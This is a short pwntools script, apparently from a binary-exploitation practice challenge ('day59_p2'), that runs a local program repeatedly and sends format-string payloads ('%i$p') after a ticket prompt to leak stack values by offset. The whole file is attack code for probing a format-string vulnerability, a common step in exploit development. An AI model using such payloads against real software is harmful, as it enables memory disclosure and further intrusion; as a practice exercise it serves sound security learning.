from pwn import *

context.binary = "./day59_p2"
context.log_level = "error"

for i in range(1, 80):
	p = process("./day59_p2")
	p.recvuntil(b"ticket:\n")
	payload = f"%{i}$p".encode()
	p.sendline(payload)
	
	out = p.recvline()
	print(i, out)
	p.close()
